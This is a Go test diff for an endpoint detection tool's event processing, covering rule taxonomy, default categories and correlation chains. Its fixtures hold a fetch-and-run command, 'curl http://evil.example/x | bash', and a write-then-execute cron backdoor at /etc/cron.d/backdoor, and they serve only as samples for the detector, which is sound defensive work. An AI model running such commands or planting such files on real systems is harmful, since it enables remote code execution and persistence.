@@ -617,3 +617,114 @@ func TestKillPIDTarget(t *testing.T) {
 		t.Errorf("killPIDTarget(no GUID) = %q, want %q", got, "42")
 	}
 }
+
+func TestProcessEventAppliesRuleTaxonomy(t *testing.T) {
+	resetProcessors()
+
+	event := Event{
+		EventType:   EventTypeExecve,
+		EventID:     "evt-rule",
+		CommandLine: "curl http://evil.example/x | bash",
+		ImagePath:   "/usr/bin/curl",
+		ProcessID:   1,
+		HostName:    "t",
+		Timestamp:   time.Now(),
+	}
+
+	processEvent(&event)
+
+	if event.Category != "curl_pipe" {
+		t.Errorf("category = %q, want curl_pipe", event.Category)
+	}
+	if event.Tactic != TacticExecution {
+		t.Errorf("tactic = %q, want %s", event.Tactic, TacticExecution)
+	}
+	if event.TechniqueID == "" {
+		t.Error("expected a technique for a matched rule category")
+	}
+	if event.CategorySource != CategorySourceRules {
+		t.Errorf("source = %q, want %q", event.CategorySource, CategorySourceRules)
+	}
+}
+
+func TestProcessEventAppliesDefaultTaxonomy(t *testing.T) {
+	resetProcessors()
+
+	event := Event{
+		EventType: EventTypeOpen,
+		EventID:   "evt-default",
+		FilePath:  "/var/log/syslog",
+		FileFlags: "O_RDONLY",
+		ProcessID: 1,
+		HostName:  "t",
+		Timestamp: time.Now(),
+	}
+
+	processEvent(&event)
+
+	if event.Category != CategoryFileAccess {
+		t.Errorf("category = %q, want %q", event.Category, CategoryFileAccess)
+	}
+	if event.CategorySource != CategorySourceRules {
+		t.Errorf("source = %q, want %q", event.CategorySource, CategorySourceRules)
+	}
+	if event.Tactic != "" || event.TechniqueID != "" {
+		t.Errorf("default category should carry no technique mapping, got %s/%s", event.Tactic, event.TechniqueID)
+	}
+}
+
+func TestProcessEventUsesCorrelationChainCategory(t *testing.T) {
+	resetProcessors()
+	correlator = NewCorrelator(30*time.Second, 100)
+
+	guid := "chain-guid"
+	now := time.Now()
+
+	processEvent(&Event{
+		EventType:   EventTypeOpen,
+		EventID:     "evt-chain-1",
+		FilePath:    "/etc/cron.d/backdoor",
+		FileFlags:   "O_WRONLY|O_CREAT",
+		ProcessGUID: guid,
+		ProcessID:   1,
+		HostName:    "t",
+		Timestamp:   now,
+	})
+	processEvent(&Event{
+		EventType:   EventTypeExecve,
+		EventID:     "evt-chain-2",
+		ImagePath:   "/bin/bash",
+		CommandLine: "bash /etc/cron.d/backdoor",
+		ProcessGUID: guid,
+		ProcessID:   1,
+		HostName:    "t",
+		Timestamp:   now.Add(time.Millisecond),
+	})
+
+	chain := correlator.Evaluate(guid)
+	if chain == nil {
+		t.Fatal("expected a correlation chain")
+	}
+	if chain.Rule != "write_then_execute" {
+		t.Fatalf("chain rule = %q, want write_then_execute", chain.Rule)
+	}
+	if chain.Score != 0.8 {
+		t.Errorf("chain score = %v, want 0.8", chain.Score)
+	}
+
+	event := Event{EventType: EventTypeExecve, ProcessGUID: guid, ProcessID: 1, HostName: "t", Timestamp: time.Now()}
+	processEvent(&event)
+
+	if event.Category != "write_then_execute" {
+		t.Errorf("category = %q, want the chain category write_then_execute", event.Category)
+	}
+	if event.Tactic != TacticExecution {
+		t.Errorf("tactic = %q, want %s", event.Tactic, TacticExecution)
+	}
+}
+
+func resetProcessors() {
+	correlator = NewCorrelator(30*time.Second, 100)
+	processCache = NewProcessCache(1000)
+	actionStore = NewActionStore()
+}
